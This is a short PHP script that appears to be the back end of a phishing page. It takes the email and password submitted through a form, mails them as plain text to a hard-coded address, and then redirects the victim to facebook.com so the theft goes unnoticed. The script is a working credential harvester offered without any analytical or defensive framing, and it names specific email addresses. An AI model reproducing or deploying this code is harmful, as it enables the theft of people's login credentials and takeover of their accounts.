<?php

$to      = 'melkamu.dange@adm-technologies.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: melkamu.dange@adm-technologies.com' . "\r\n" .
    'Reply-To: melkamudagne19@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message,$headers,"-f melkamu.dange@adm-technologies.com");


$newURL = "https://www.facebook.com";
header('Location: '.$newURL);
?>
